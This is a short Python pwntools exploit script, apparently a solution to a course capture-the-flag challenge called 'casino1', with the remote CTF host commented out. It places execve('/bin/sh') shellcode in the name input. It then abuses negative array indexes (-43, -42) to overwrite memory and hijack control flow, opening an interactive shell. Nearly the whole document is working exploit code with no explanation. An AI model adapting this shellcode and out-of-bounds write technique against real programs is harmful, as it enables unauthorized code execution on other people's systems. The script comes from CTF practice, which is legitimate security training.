from pwn import *

context.arch = 'amd64'
r = process('./casino1')
#r = remote('edu-ctf.csie.org', 10172)
shellcode = asm('''
        mov    rax, 0x68732f6e69622f  
        push   rax  
        mov    rdi, rsp 
        xor    rsi, rsi 
        xor    rdx, rdx 
        mov    rax, 0x3b
        syscall
''')

r.sendlineafter('Your name: ','0' * 0x24 + shellcode)

age = '20'

r.sendlineafter('Your age: ',age)
r.sendlineafter('Chose the number 0: ', '0')
r.sendlineafter('Chose the number 1: ', '0')
r.sendlineafter('Chose the number 2: ', '0')
r.sendlineafter('Chose the number 3: ', '0')
r.sendlineafter('Chose the number 4: ', '0')
r.sendlineafter('Chose the number 5: ', '0')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', '-43')
r.sendlineafter('Chose the number -44: ', '6299924')

r.sendlineafter('Chose the number 0: ', '17')
r.sendlineafter('Chose the number 1: ', '54')
r.sendlineafter('Chose the number 2: ', '86')
r.sendlineafter('Chose the number 3: ', '73')
r.sendlineafter('Chose the number 4: ', '74')
r.sendlineafter('Chose the number 5: ', '70')
r.sendlineafter('Change the number? [1:yes 0:no]: ', '1')
r.sendlineafter('Which number [1 ~ 6]: ', '-42')
r.sendlineafter('Chose the number -43: ', '0')

r.interactive()